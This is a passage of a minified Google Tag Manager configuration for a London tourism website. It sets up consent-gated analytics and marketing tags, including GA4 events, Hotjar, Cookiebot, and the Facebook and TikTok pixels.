(function (w, g) {
  (w[g] = w[g] || {}),
    (w[g].e = function (s) {
      return eval(s);
    });
})(window, "google_tag_manager"),
  (function () {
    var ba,
      data = {
        resource: {
          version: "180",
          macros: [
            { function: "__e" },
            {
              function: "__v",
              vtp_name: "gtm.triggers",
              vtp_dataLayerVersion: 2,
              vtp_setDefaultValue: !0,
              vtp_defaultValue: "",
            },
            {
              function: "__u",
              vtp_component: "PATH",
              vtp_enableMultiQueryKeys: !1,
              vtp_enableIgnoreEmptyQueryParam: !1,
            },
            {
              function: "__d",
              vtp_elementSelector: ".home",
              vtp_attributeName: "class",
              vtp_selectorType: "CSS",
            },
            {
              function: "__u",
              vtp_component: "URL",
              vtp_enableMultiQueryKeys: !1,
              vtp_enableIgnoreEmptyQueryParam: !1,
            },
            {
              function: "__v",
              vtp_name: "gtm.scrollThreshold",
              vtp_dataLayerVersion: 1,
            },
            { function: "__c", vtp_value: "G-BDFPSHTGM0" },
            {
              function: "__v",
              vtp_name: "gtm.elementUrl",
              vtp_dataLayerVersion: 1,
            },
            {
              function: "__jsm",
              vtp_javascript: [
                "template",
                "(function(){var c=/(?:tickets\\.london|hotels\\.london|booking\\.com|londonpass\\.com|visitbritainshop\\.com|gttix\\.com|visitlondon\\.gttickets\\.com|prf\\.hn|bookatable\\.com|redletterdays\\.co\\.uk|buyagift\\.co\\.uk|thetrainline\\.com|seetickets\\.com|click\\.linksynergy\\.com)/i,b=",
                ["escape", ["macro", 7], 8, 16],
                ",a=b.match(/^https?:\\/\\/([^\\/?#]+)(?:[\\/?#]|$)/i);a=a&&a[1];return b!==null&&a!==null&&c.test(a)?!0:!1})();",
              ],
            },
            {
              function: "__v",
              vtp_name: "gtm.elementClasses",
              vtp_dataLayerVersion: 1,
            },
            {
              function: "__v",
              vtp_name: "gtm.elementId",
              vtp_dataLayerVersion: 1,
            },
            {
              function: "__aev",
              vtp_setDefaultValue: !1,
              vtp_varType: "ATTRIBUTE",
              vtp_attribute: "data-ga-link",
            },
            {
              function: "__v",
              vtp_name: "gtm.element",
              vtp_dataLayerVersion: 1,
            },
            {
              function: "__jsm",
              vtp_javascript: [
                "template",
                "(function(){function b(a,c){for(;(a=a.parentNode)&&a!==document;)if(a.matches(c))return!0;return!1}return ",
                ["escape", ["macro", 11], 8, 16],
                "?",
                ["escape", ["macro", 11], 8, 16],
                ":b(",
                ["escape", ["macro", 12], 8, 16],
                ',".main-nav .snippet")?"White Label Menu Promo":b(',
                ["escape", ["macro", 12], 8, 16],
                ',".main-nav")?"White Label Menu Link":"White Label Link"})();',
              ],
            },
            {
              function: "__aev",
              vtp_setDefaultValue: !1,
              vtp_stripWww: !1,
              vtp_varType: "URL",
              vtp_component: "HOST",
            },
            {
              function: "__v",
              vtp_name: "gtm.elementUrl",
              vtp_dataLayerVersion: 1,
            },
            {
              function: "__jsm",
              vtp_javascript: [
                "template",
                "(function(){var c=/(?:tickets\\.london|hotels\\.london|booking\\.com|londonpass\\.com|visitbritainshop\\.com|gttix\\.com|visitlondon\\.gttickets\\.com|prf\\.hn|bookatable\\.com|redletterdays\\.co\\.uk|buyagift\\.co\\.uk|thetrainline\\.com|seetickets\\.com|click\\.linksynergy\\.com)/i,b=",
                ["escape", ["macro", 15], 8, 16],
                ",a=b.match(/^https?:\\/\\/([^\\/?#]+)(?:[\\/?#]|$)/i);a=a&&a[1];return b!==null&&a!==null&&c.test(a)?!0:!1})();",
              ],
            },
            {
              function: "__v",
              vtp_name: "gtm.elementClasses",
              vtp_dataLayerVersion: 1,
            },
            {
              function: "__v",
              vtp_name: "gtm.elementId",
              vtp_dataLayerVersion: 1,
            },
            {
              function: "__jsm",
              vtp_javascript: [
                "template",
                "(function(){return ",
                ["escape", ["macro", 11], 8, 16],
                "?",
                ["escape", ["macro", 11], 8, 16],
                ':"White Label Form"})();',
              ],
            },
            {
              function: "__jsm",
              vtp_javascript: [
                "template",
                "(function(){var a=",
                ["escape", ["macro", 12], 8, 16],
                ';return a.textContent.includes("Mastercard")||a.parentElement.textContent.includes("Mastercard")||a.parentElement.textContent.includes("Priceless")})();',
              ],
            },
            {
              function: "__v",
              vtp_name: "gtm.videoCurrentTime",
              vtp_dataLayerVersion: 1,
            },
            {
              function: "__v",
              vtp_name: "gtm.videoDuration",
              vtp_dataLayerVersion: 1,
            },
            {
              function: "__v",
              vtp_name: "gtm.videoPercent",
              vtp_dataLayerVersion: 1,
            },
            {
              function: "__v",
              vtp_name: "gtm.videoProvider",
              vtp_dataLayerVersion: 1,
            },
            {
              function: "__v",
              vtp_name: "gtm.videoTitle",
              vtp_dataLayerVersion: 1,
            },
            {
              function: "__v",
              vtp_name: "gtm.videoUrl",
              vtp_dataLayerVersion: 1,
            },
            {
              function: "__v",
              vtp_name: "gtm.videoStatus",
              vtp_dataLayerVersion: 1,
            },
            {
              function: "__jsm",
              vtp_javascript: [
                "template",
                "(function(){if(",
                ["escape", ["macro", 27], 8, 16],
                '=="start"){for(var b=document.querySelectorAll(".video-roll .video-launcher a"),c,a=0;a<b.length;++a)',
                ["escape", ["macro", 26], 8, 16],
                ".includes(b[a].dataset.youtubeid)&&(c=1+a);return c}})();",
              ],
            },
            {
              function: "__jsm",
              vtp_javascript: [
                "template",
                "(function(){return ",
                ["escape", ["macro", 12], 8, 16],
                '.getAttribute("hreflang")})();',
              ],
            },
            {
              function: "__jsm",
              vtp_javascript: [
                "template",
                '(function(){return document.querySelector(".lang-picker-menu .selected").getAttribute("hreflang")})();',
              ],
            },
            {
              function: "__jsm",
              vtp_javascript: [
                "template",
                "(function(){return ",
                ["escape", ["macro", 12], 8, 16],
                '.querySelector("h3").innerText})();',
              ],
            },
            {
              function: "__jsm",
              vtp_javascript: [
                "template",
                "(function(){return ",
                ["escape", ["macro", 12], 8, 16],
                ".innerText})();",
              ],
            },
            {
              function: "__jsm",
              vtp_javascript: [
                "template",
                "(function(){return ",
                ["escape", ["macro", 12], 8, 16],
                ".parentElement.href})();",
              ],
            },
            {
              function: "__jsm",
              vtp_javascript: [
                "template",
                "(function(){return ",
                ["escape", ["macro", 12], 8, 16],
                '.parentElement.querySelector(".textbox h3").textContent})();',
              ],
            },
            {
              function: "__jsm",
              vtp_javascript: [
                "template",
                "(function(){return ",
                ["escape", ["macro", 12], 8, 16],
                '.closest(".row4-feature")?"Feature Row of 4":',
                ["escape", ["macro", 12], 8, 16],
                '.closest(".row4-desc")?"Row 4 Tiles":',
                ["escape", ["macro", 12], 8, 16],
                '.closest(".row6-prices")?"Row of 6":',
                ["escape", ["macro", 12], 8, 16],
                '.closest(".row3")?"Row of 3":"other componenrt"})();',
              ],
            },
            { function: "__r" },
            {
              function: "__jsm",
              vtp_javascript: [
                "template",
                "(function(){return VL.country||null})();",
              ],
            },
            {
              function: "__jsm",
              vtp_javascript: [
                "template",
                '(function(){return!!document.getElementById("hiltonSearch")})();',
              ],
            },
            {
              function: "__gas",
              vtp_cookieDomain: "auto",
              vtp_doubleClick: !1,
              vtp_setTrackerName: !1,
              vtp_useDebugVersion: !1,
              vtp_fieldsToSet: [
                "list",
                ["map", "fieldName", "allowLinker", "value", "true"],
              ],
              vtp_useHashAutoLink: !1,
              vtp_decorateFormsAutoLink: !1,
              vtp_enableLinkId: !1,
              vtp_enableEcommerce: !1,
              vtp_trackingId: "UA-2758654-2",
              vtp_enableRecaptchaOption: !1,
              vtp_enableUaRlsa: !1,
              vtp_enableUseInternalVersion: !1,
              vtp_enableGA4Schema: !0,
            },
            {
              function: "__jsm",
              vtp_javascript: [
                "template",
                "(function(){return 10<=",
                ["escape", ["macro", 5], 8, 16],
                "<=25})();",
              ],
            },
            {
              function: "__d",
              vtp_elementSelector: "body",
              vtp_attributeName: "class",
              vtp_selectorType: "CSS",
            },
            {
              function: "__d",
              vtp_elementSelector: ".advert",
              vtp_attributeName: "id",
              vtp_selectorType: "CSS",
            },
            {
              function: "__d",
              vtp_elementSelector: "div.article-body",
              vtp_attributeName: "class",
              vtp_selectorType: "CSS",
            },
            {
              function: "__jsm",
              vtp_javascript: [
                "template",
                "(function(){return Cookiebot.consent.marketing.toString()})();",
              ],
            },
            {
              function: "__jsm",
              vtp_javascript: [
                "template",
                "(function(){return Cookiebot.consent.prefrences.toString()})();",
              ],
            },
            {
              function: "__jsm",
              vtp_javascript: [
                "template",
                "(function(){return Cookiebot.consent.statistics.toString()})();",
              ],
            },
            {
              function: "__d",
              convert_case_to: 2,
              convert_undefined_to: "EN",
              vtp_elementSelector: "html",
              vtp_attributeName: "lang",
              vtp_selectorType: "CSS",
            },
            {
              function: "__aev",
              vtp_setDefaultValue: !1,
              vtp_varType: "URL",
              vtp_component: "IS_OUTBOUND",
              vtp_affiliatedDomains:
                "cdn.londonandpartners.com, cdn-lnp.dataweavers.io, files.londonandpartners.com",
            },
            {
              function: "__jsm",
              vtp_javascript: [
                "template",
                "(function(){var a=",
                ["escape", ["macro", 12], 8, 16],
                ';if(a.parentElement.classList.contains("lp-310-panel"))return"Landing Page Tile";if(a.parentElement.classList.contains("panel"))return"Landing Page Panel";if(a.parentElement.classList.contains("inline-booking-promo"))return"Promo Box";if(a.parentElement.classList.contains("search-intro"))return"Browse Page";if(a.parentElement.classList.contains("product-header"))return"Product Page";if("HEADER"==a.parentElement.tagName)return"Advertorial Page"})();',
              ],
            },
            {
              function: "__u",
              vtp_component: "HOST",
              vtp_enableMultiQueryKeys: !1,
              vtp_enableIgnoreEmptyQueryParam: !1,
            },
            { function: "__f", vtp_component: "URL" },
            { function: "__e" },
            {
              function: "__v",
              vtp_name: "gtm.elementTarget",
              vtp_dataLayerVersion: 1,
            },
            { function: "__aev", vtp_varType: "TEXT" },
            {
              function: "__v",
              vtp_name: "gtm.element",
              vtp_dataLayerVersion: 1,
            },
            {
              function: "__v",
              vtp_name: "gtm.elementTarget",
              vtp_dataLayerVersion: 1,
            },
            { function: "__aev", vtp_varType: "TEXT" },
            {
              function: "__v",
              vtp_name: "gtm.videoVisible",
              vtp_dataLayerVersion: 1,
            },
            {
              function: "__v",
              vtp_name: "gtm.scrollUnits",
              vtp_dataLayerVersion: 1,
            },
            {
              function: "__v",
              vtp_name: "gtm.scrollDirection",
              vtp_dataLayerVersion: 1,
            },
          ],
          tags: [
            {
              function: "__html",
              priority: 100,
              metadata: ["map"],
              once_per_event: !0,
              vtp_html:
                '<script type="text/gtmscript">var contentPlaceholder=document.body.querySelector("#cookieDeclarationWrapper"),contentPlaceholderTable=contentPlaceholder.querySelector("table"),cookieDeclarationScript=document.createElement("script");cookieDeclarationScript.type="text/javascript";cookieDeclarationScript.id="CookieDeclaration";cookieDeclarationScript.src="https://consent.cookiebot.com/432fd9cd-b46a-411f-91b2-872aca63bbe3/cd.js";contentPlaceholderTable.remove();contentPlaceholder.appendChild(cookieDeclarationScript);</script>',
              vtp_supportDocumentWrite: !1,
              vtp_enableIframeMode: !1,
              vtp_enableEditJsMacroBehavior: !1,
              tag_id: 56,
            },
            { function: "__paused", vtp_originalTagType: "html", tag_id: 20 },
            { function: "__paused", vtp_originalTagType: "ua", tag_id: 38 },
            { function: "__paused", vtp_originalTagType: "html", tag_id: 52 },
            { function: "__paused", vtp_originalTagType: "html", tag_id: 169 },
            { function: "__paused", vtp_originalTagType: "html", tag_id: 170 },
            { function: "__paused", vtp_originalTagType: "html", tag_id: 171 },
            { function: "__paused", vtp_originalTagType: "html", tag_id: 172 },
            { function: "__paused", vtp_originalTagType: "opt", tag_id: 187 },
            {
              function: "__pntr",
              metadata: ["map"],
              consent: ["list", "ad_storage"],
              once_per_event: !0,
              vtp_tagId: "2613464899537",
              vtp_eventName: "",
              tag_id: 189,
            },
            {
              function: "__paused",
              vtp_originalTagType: "googtag",
              tag_id: 190,
            },
            {
              function: "__hjtc",
              metadata: ["map"],
              consent: ["list", "analytics_storage"],
              teardown_tags: ["list", ["tag", 54, 0]],
              once_per_event: !0,
              vtp_hotjar_site_id: "2544438",
              tag_id: 192,
            },
            { function: "__paused", vtp_originalTagType: "html", tag_id: 196 },
            { function: "__paused", vtp_originalTagType: "flc", tag_id: 197 },
            { function: "__paused", vtp_originalTagType: "html", tag_id: 199 },
            { function: "__paused", vtp_originalTagType: "html", tag_id: 200 },
            {
              function: "__gclidw",
              metadata: ["map"],
              once_per_event: !0,
              vtp_enableCrossDomain: !1,
              vtp_enableUrlPassthrough: !1,
              vtp_enableCookieOverrides: !1,
              tag_id: 201,
            },
            {
              function: "__gaawe",
              metadata: ["map"],
              once_per_event: !0,
              vtp_sendEcommerceData: !1,
              vtp_eventSettingsTable: [
                "list",
                [
                  "map",
                  "parameter",
                  "percent_scrolled",
                  "parameterValue",
                  ["macro", 5],
                ],
              ],
              vtp_eventName: "scroll",
              vtp_measurementIdOverride: ["macro", 6],
              vtp_enableUserProperties: !0,
              vtp_enableMoreSettingsOption: !0,
              vtp_enableEuid: !0,
              vtp_migratedToV2: !0,
              vtp_demoV2: !1,
              tag_id: 205,
            },
            { function: "__paused", vtp_originalTagType: "flc", tag_id: 206 },
            {
              function: "__gaawe",
              metadata: ["map"],
              once_per_event: !0,
              vtp_sendEcommerceData: !1,
              vtp_eventSettingsTable: [
                "list",
                [
                  "map",
                  "parameter",
                  "link_classes",
                  "parameterValue",
                  ["macro", 9],
                ],
                [
                  "map",
                  "parameter",
                  "link_id",
                  "parameterValue",
                  ["macro", 10],
                ],
                [
                  "map",
                  "parameter",
                  "link_url",
                  "parameterValue",
                  ["macro", 7],
                ],
                [
                  "map",
                  "parameter",
                  "white_label_link_type",
                  "parameterValue",
                  ["macro", 13],
                ],
                [
                  "map",
                  "parameter",
                  "link_domain",
                  "parameterValue",
                  ["macro", 14],
                ],
              ],
              vtp_eventName: "white_label_interaction",
              vtp_measurementIdOverride: "G-BDFPSHTGM0",
              vtp_enableUserProperties: !0,
              vtp_enableMoreSettingsOption: !0,
              vtp_enableEuid: !0,
              vtp_migratedToV2: !0,
              vtp_demoV2: !1,
              tag_id: 209,
            },
            {
              function: "__gaawe",
              metadata: ["map"],
              once_per_event: !0,
              vtp_sendEcommerceData: !1,
              vtp_eventSettingsTable: [
                "list",
                [
                  "map",
                  "parameter",
                  "link_classes",
                  "parameterValue",
                  ["macro", 17],
                ],
                [
                  "map",
                  "parameter",
                  "link_id",
                  "parameterValue",
                  ["macro", 18],
                ],
                [
                  "map",
                  "parameter",
                  "link_url",
                  "parameterValue",
                  ["macro", 15],
                ],
                [
                  "map",
                  "parameter",
                  "white_label_link_type",
                  "parameterValue",
                  ["macro", 19],
                ],
                [
                  "map",
                  "parameter",
                  "link_domain",
                  "parameterValue",
                  ["macro", 14],
                ],
              ],
              vtp_eventName: "white_label_interaction",
              vtp_measurementIdOverride: "G-BDFPSHTGM0",
              vtp_enableUserProperties: !0,
              vtp_enableMoreSettingsOption: !0,
              vtp_enableEuid: !0,
              vtp_migratedToV2: !0,
              vtp_demoV2: !1,
              tag_id: 218,
            },
            {
              function: "__cvt_6985533_220",
              metadata: ["map"],
              once_per_event: !0,
              vtp_adsDataRedaction: "dynamic",
              vtp_serial: "432fd9cd-b46a-411f-91b2-872aca63bbe3",
              vtp_iabFramework: !1,
              vtp_language: "auto",
              vtp_urlPassthrough: !1,
              vtp_consentModeEnabled: !0,
              vtp_waitForUpdate: "2000",
              vtp_regionSettings: [
                "list",
                [
                  "map",
                  "region",
                  "",
                  "defaultConsentPreferences",
                  "denied",
                  "defaultConsentStatistics",
                  "denied",
                  "defaultConsentMarketing",
                  "denied",
                ],
              ],
              tag_id: 221,
            },
            { function: "__paused", vtp_originalTagType: "html", tag_id: 222 },
            { function: "__paused", vtp_originalTagType: "gaawe", tag_id: 225 },
            {
              function: "__gaawe",
              metadata: ["map"],
              once_per_event: !0,
              vtp_sendEcommerceData: !1,
              vtp_eventSettingsTable: [
                "list",
                [
                  "map",
                  "parameter",
                  "video_current_time",
                  "parameterValue",
                  ["macro", 21],
                ],
                [
                  "map",
                  "parameter",
                  "video_duration",
                  "parameterValue",
                  ["macro", 22],
                ],
                [
                  "map",
                  "parameter",
                  "video_percent",
                  "parameterValue",
                  ["macro", 23],
                ],
                [
                  "map",
                  "parameter",
                  "video_provider",
                  "parameterValue",
                  ["macro", 24],
                ],
                [
                  "map",
                  "parameter",
                  "video_title",
                  "parameterValue",
                  ["macro", 25],
                ],
                [
                  "map",
                  "parameter",
                  "video_url",
                  "parameterValue",
                  ["macro", 26],
                ],
                [
                  "map",
                  "parameter",
                  "video_carousel_position",
                  "parameterValue",
                  ["macro", 28],
                ],
              ],
              vtp_enhancedUserId: !1,
              vtp_eventName: ["template", "video_", ["macro", 27]],
              vtp_measurementIdOverride: ["macro", 6],
              vtp_enableUserProperties: !0,
              vtp_enableMoreSettingsOption: !0,
              vtp_enableEuid: !0,
              vtp_migratedToV2: !0,
              vtp_demoV2: !1,
              tag_id: 231,
            },
            {
              function: "__gaawe",
              metadata: ["map"],
              once_per_event: !0,
              vtp_sendEcommerceData: !1,
              vtp_enhancedUserId: !1,
              vtp_eventSettingsTable: [
                "list",
                [
                  "map",
                  "parameter",
                  "lang_picker_new_language",
                  "parameterValue",
                  ["macro", 29],
                ],
                [
                  "map",
                  "parameter",
                  "lang_picker_old_language",
                  "parameterValue",
                  ["macro", 30],
                ],
              ],
              vtp_eventName: "lang_picker_click",
              vtp_measurementIdOverride: ["macro", 6],
              vtp_enableUserProperties: !0,
              vtp_enableMoreSettingsOption: !0,
              vtp_enableEuid: !0,
              vtp_migratedToV2: !0,
              vtp_demoV2: !1,
              tag_id: 236,
            },
            {
              function: "__gaawe",
              metadata: ["map"],
              once_per_event: !0,
              vtp_sendEcommerceData: !1,
              vtp_eventSettingsTable: [
                "list",
                [
                  "map",
                  "parameter",
                  "link_classes",
                  "parameterValue",
                  ["macro", 9],
                ],
                [
                  "map",
                  "parameter",
                  "link_id",
                  "parameterValue",
                  ["macro", 10],
                ],
                [
                  "map",
                  "parameter",
                  "link_url",
                  "parameterValue",
                  "https://www.tiqets.com/en/the-view-from-the-shard-tickets-l145499/",
                ],
                [
                  "map",
                  "parameter",
                  "white_label_link_type",
                  "parameterValue",
                  "Widget",
                ],
                [
                  "map",
                  "parameter",
                  "link_domain",
                  "parameterValue",
                  "tiqets.com",
                ],
              ],
              vtp_enhancedUserId: !1,
              vtp_eventName: "white_label_interaction",
              vtp_measurementIdOverride: "G-BDFPSHTGM0",
              vtp_enableUserProperties: !0,
              vtp_enableMoreSettingsOption: !0,
              vtp_enableEuid: !0,
              vtp_migratedToV2: !0,
              vtp_demoV2: !1,
              tag_id: 241,
            },
            {
              function: "__gaawe",
              metadata: ["map"],
              once_per_event: !0,
              vtp_sendEcommerceData: !1,
              vtp_enhancedUserId: !1,
              vtp_eventSettingsTable: [
                "list",
                [
                  "map",
                  "parameter",
                  "video_carousel_title",
                  "parameterValue",
                  ["macro", 31],
                ],
              ],
              vtp_eventName: "video_carousel_scroll",
              vtp_measurementIdOverride: ["macro", 6],
              vtp_enableUserProperties: !0,
              vtp_enableMoreSettingsOption: !0,
              vtp_enableEuid: !0,
              vtp_migratedToV2: !0,
              vtp_demoV2: !1,
              tag_id: 243,
            },
            {
              function: "__gaawe",
              metadata: ["map"],
              once_per_event: !0,
              vtp_sendEcommerceData: !1,
              vtp_enhancedUserId: !1,
              vtp_eventSettingsTable: [
                "list",
                [
                  "map",
                  "parameter",
                  "call_out_ribbon_text",
                  "parameterValue",
                  ["macro", 32],
                ],
                [
                  "map",
                  "parameter",
                  "call_out_ribbon_url",
                  "parameterValue",
                  ["macro", 33],
                ],
                [
                  "map",
                  "parameter",
                  "call_out_ribbon_tile_text",
                  "parameterValue",
                  ["macro", 34],
                ],
                [
                  "map",
                  "parameter",
                  "call_out_ribbon_page",
                  "parameterValue",
                  ["macro", 4],
                ],
                [
                  "map",
                  "parameter",
                  "call_out_ribbon_component",
                  "parameterValue",
                  ["macro", 35],
                ],
              ],
              vtp_eventName: "call_out_ribbon",
              vtp_measurementIdOverride: ["macro", 6],
              vtp_enableUserProperties: !0,
              vtp_enableMoreSettingsOption: !0,
              vtp_enableEuid: !0,
              vtp_migratedToV2: !0,
              vtp_demoV2: !1,
              tag_id: 250,
            },
            {
              function: "__gaawe",
              metadata: ["map"],
              once_per_event: !0,
              vtp_sendEcommerceData: !1,
              vtp_enhancedUserId: !1,
              vtp_eventName: "review_engagement",
              vtp_measurementIdOverride: ["macro", 6],
              vtp_enableUserProperties: !0,
              vtp_enableMoreSettingsOption: !0,
              vtp_enableEuid: !0,
              vtp_migratedToV2: !0,
              vtp_demoV2: !1,
              tag_id: 256,
            },
            {
              function: "__gaawe",
              metadata: ["map"],
              once_per_load: !0,
              vtp_sendEcommerceData: !1,
              vtp_enhancedUserId: !1,
              vtp_eventName: "hotjar_survey_view",
              vtp_measurementIdOverride: ["macro", 6],
              vtp_enableUserProperties: !0,
              vtp_enableMoreSettingsOption: !0,
              vtp_enableEuid: !0,
              vtp_migratedToV2: !0,
              vtp_demoV2: !1,
              tag_id: 258,
            },
            {
              function: "__gaawe",
              metadata: ["map"],
              once_per_load: !0,
              vtp_sendEcommerceData: !1,
              vtp_enhancedUserId: !1,
              vtp_eventName: "hotjar_survey_interaction",
              vtp_measurementIdOverride: ["macro", 6],
              vtp_enableUserProperties: !0,
              vtp_enableMoreSettingsOption: !0,
              vtp_enableEuid: !0,
              vtp_migratedToV2: !0,
              vtp_demoV2: !1,
              tag_id: 260,
            },
            {
              function: "__gaawe",
              metadata: ["map"],
              once_per_load: !0,
              vtp_sendEcommerceData: !1,
              vtp_enhancedUserId: !1,
              vtp_eventName: "hotjar_survey_completion",
              vtp_measurementIdOverride: ["macro", 6],
              vtp_enableUserProperties: !0,
              vtp_enableMoreSettingsOption: !0,
              vtp_enableEuid: !0,
              vtp_migratedToV2: !0,
              vtp_demoV2: !1,
              tag_id: 262,
            },
            {
              function: "__lcl",
              vtp_waitForTags: !1,
              vtp_checkValidation: !1,
              vtp_waitForTagsTimeout: "2000",
              vtp_uniqueTriggerId: "6985533_45",
              tag_id: 263,
            },
            {
              function: "__lcl",
              vtp_waitForTags: !1,
              vtp_checkValidation: !1,
              vtp_waitForTagsTimeout: "2000",
              vtp_uniqueTriggerId: "6985533_53",
              tag_id: 264,
            },
            {
              function: "__sdl",
              vtp_verticalThresholdUnits: "PERCENT",
              vtp_verticalThresholdsPercent: "25,50,75,100",
              vtp_verticalThresholdOn: !0,
              vtp_triggerStartOption: "CONTAINER_LOAD",
              vtp_horizontalThresholdOn: !1,
              vtp_uniqueTriggerId: "6985533_101",
              vtp_enableTriggerStartOption: !0,
              tag_id: 265,
            },
            {
              function: "__evl",
              vtp_useOnScreenDuration: !1,
              vtp_useDomChangeListener: !1,
              vtp_elementSelector:
                ".spons-label, .spons-light, .spons-label-light",
              vtp_firingFrequency: "ONCE_PER_ELEMENT",
              vtp_selectorType: "CSS",
              vtp_onScreenRatio: "50",
              vtp_uniqueTriggerId: "6985533_195",
              tag_id: 266,
            },
            {
              function: "__lcl",
              vtp_waitForTags: !0,
              vtp_checkValidation: !1,
              vtp_waitForTagsTimeout: "200",
              vtp_uniqueTriggerId: "6985533_208",
              tag_id: 267,
            },
            {
              function: "__fsl",
              vtp_waitForTags: !0,
              vtp_waitForTagsTimeout: "200",
              vtp_uniqueTriggerId: "6985533_217",
              tag_id: 268,
            },
            {
              function: "__evl",
              vtp_useOnScreenDuration: !1,
              vtp_useDomChangeListener: !1,
              vtp_elementSelector:
                ".spons-label, .spons-light, .spons-label-light",
              vtp_firingFrequency: "ONCE_PER_ELEMENT",
              vtp_selectorType: "CSS",
              vtp_onScreenRatio: "50",
              vtp_uniqueTriggerId: "6985533_224",
              tag_id: 269,
            },
            {
              function: "__ytl",
              vtp_progressThresholdsPercent: "25, 50, 75, 90",
              vtp_captureComplete: !0,
              vtp_captureStart: !0,
              vtp_fixMissingApi: !0,
              vtp_triggerStartOption: "DOM_READY",
              vtp_radioButtonGroup1: "PERCENTAGE",
              vtp_capturePause: !1,
              vtp_captureProgress: !0,
              vtp_uniqueTriggerId: "6985533_230",
              vtp_enableTriggerStartOption: !0,
              tag_id: 270,
            },
            {
              function: "__lcl",
              vtp_waitForTags: !1,
              vtp_checkValidation: !1,
              vtp_waitForTagsTimeout: "2000",
              vtp_uniqueTriggerId: "6985533_233",
              tag_id: 271,
            },
            { function: "__cl", tag_id: 272 },
            {
              function: "__evl",
              vtp_useOnScreenDuration: !1,
              vtp_useDomChangeListener: !1,
              vtp_elementSelector: ".video-roll .video-launcher",
              vtp_firingFrequency: "MANY_PER_ELEMENT",
              vtp_selectorType: "CSS",
              vtp_onScreenRatio: "50",
              vtp_uniqueTriggerId: "6985533_244",
              tag_id: 273,
            },
            {
              function: "__evl",
              vtp_useOnScreenDuration: !1,
              vtp_useDomChangeListener: !1,
              vtp_elementSelector: "a > .callout-ribbon",
              vtp_firingFrequency: "ONCE_PER_ELEMENT",
              vtp_selectorType: "CSS",
              vtp_onScreenRatio: "50",
              vtp_uniqueTriggerId: "6985533_249",
              tag_id: 274,
            },
            {
              function: "__evl",
              vtp_useOnScreenDuration: !1,
              vtp_useDomChangeListener: !0,
              vtp_elementSelector: 'section[data-tabclass="Reviews"]',
              vtp_firingFrequency: "ONCE_PER_ELEMENT",
              vtp_selectorType: "CSS",
              vtp_onScreenRatio: "50",
              vtp_uniqueTriggerId: "6985533_255",
              tag_id: 275,
            },
            {
              function: "__evl",
              vtp_useOnScreenDuration: !1,
              vtp_useDomChangeListener: !0,
              vtp_elementSelector:
                '._hj-widget-container [aria-label="Survey"] form',
              vtp_firingFrequency: "MANY_PER_ELEMENT",
              vtp_selectorType: "CSS",
              vtp_onScreenRatio: "50",
              vtp_uniqueTriggerId: "6985533_257",
              tag_id: 276,
            },
            { function: "__cl", tag_id: 277 },
            {
              function: "__evl",
              vtp_useOnScreenDuration: !1,
              vtp_useDomChangeListener: !0,
              vtp_elementSelector:
                '._hj-widget-container [aria-label="Survey"] form button[size="m"]',
              vtp_firingFrequency: "MANY_PER_ELEMENT",
              vtp_selectorType: "CSS",
              vtp_onScreenRatio: "50",
              vtp_uniqueTriggerId: "6985533_261",
              tag_id: 278,
            },
            {
              function: "__html",
              metadata: ["map"],
              consent: ["list", "ad_storage"],
              once_per_event: !0,
              vtp_html:
                '\n<script type="text/gtmscript">setTimeout(function(){!function(b,e,f,g,a,c,d){b.fbq||(a=b.fbq=function(){a.callMethod?a.callMethod.apply(a,arguments):a.queue.push(arguments)},b._fbq||(b._fbq=a),a.push=a,a.loaded=!0,a.version="2.0",a.queue=[],c=e.createElement(f),c.async=!0,c.src=g,d=e.getElementsByTagName(f)[0],d.parentNode.insertBefore(c,d))}(window,document,"script","https://connect.facebook.net/en_US/fbevents.js");fbq("init","969083459772855");fbq("init","2412401675689396");fbq("init","958568721193646");fbq("init","571998143550104");\nfbq("set","agent","tmgoogletagmanager","969083459772855");fbq("track","PageView")},3E3);</script>\n',
              vtp_supportDocumentWrite: !1,
              vtp_enableIframeMode: !1,
              vtp_enableEditJsMacroBehavior: !1,
              tag_id: 7,
            },
            {
              function: "__html",
              metadata: ["map"],
              consent: ["list", "analytics_storage"],
              once_per_event: !0,
              vtp_html:
                '<script data-gtmsrc="//rum-static.pingdom.net/pa-5d25c291b258c500080000db.js" async type="text/gtmscript"></script>\n',
              vtp_supportDocumentWrite: !1,
              vtp_enableIframeMode: !1,
              vtp_enableEditJsMacroBehavior: !1,
              tag_id: 54,
            },
            {
              function: "__html",
              metadata: ["map"],
              once_per_event: !0,
              vtp_html:
                '<script type="text/gtmscript">document.body.classList.add("lets-do-london");</script>',
              vtp_supportDocumentWrite: !1,
              vtp_enableIframeMode: !1,
              vtp_enableEditJsMacroBehavior: !1,
              tag_id: 60,
            },
            {
              function: "__html",
              metadata: ["map"],
              consent: ["list", "analytics_storage", "ad_storage"],
              once_per_event: !0,
              vtp_html:
                '<script type="text/gtmscript">!function(d,g,e){d.TiktokAnalyticsObject=e;var a=d[e]=d[e]||[];a.methods="page track identify instances debug on off once ready alias group enableCookie disableCookie".split(" ");a.setAndDefer=function(b,c){b[c]=function(){b.push([c].concat(Array.prototype.slice.call(arguments,0)))}};for(d=0;d<a.methods.length;d++)a.setAndDefer(a,a.methods[d]);a.instance=function(b){b=a._i[b]||[];for(var c=0;c<a.methods.length;c++)a.setAndDefer(b,a.methods[c]);return b};a.load=function(b,c){var f="https://analytics.tiktok.com/i18n/pixel/events.js";\na._i=a._i||{};a._i[b]=[];a._i[b]._u=f;a._t=a._t||{};a._t[b]=+new Date;a._o=a._o||{};a._o[b]=c||{};c=document.createElement("script");c.type="text/javascript";c.async=!0;c.src=f+"?sdkid\\x3d"+b+"\\x26lib\\x3d"+e;b=document.getElementsByTagName("script")[0];b.parentNode.insertBefore(c,b)};a.load("CAK4BK3C77UEV29MU4V0");a.page()}(window,document,"ttq");</script>\n',
              vtp_supportDocumentWrite: !1,
              vtp_enableIframeMode: !1,
              vtp_enableEditJsMacroBehavior: !1,
              tag_id: 202,
            },
            {
              function: "__html",
              metadata: ["map"],
              once_per_event: !0,
              vtp_html:
                '<script type="text/gtmscript">window._conv_q.push(["consentGiven"]);</script>',
              vtp_supportDocumentWrite: !1,
              vtp_enableIframeMode: !1,
              vtp_enableEditJsMacroBehavior: !1,
              tag_id: 227,
            },
            {
              function: "__html",
              metadata: ["map"],
              consent: ["list", "analytics_storage"],
              once_per_event: !0,
              vtp_html: [
                "template",
                '<script type="text/gtmscript">window.hj=window.hj||function(){(hj.q=hj.q||[]).push(arguments)};var userId=null;window.hj("identify",userId,{country:',
                ["escape", ["macro", 37], 8, 16],
                "});</script>",
              ],
              vtp_supportDocumentWrite: !1,
              vtp_enableIframeMode: !1,
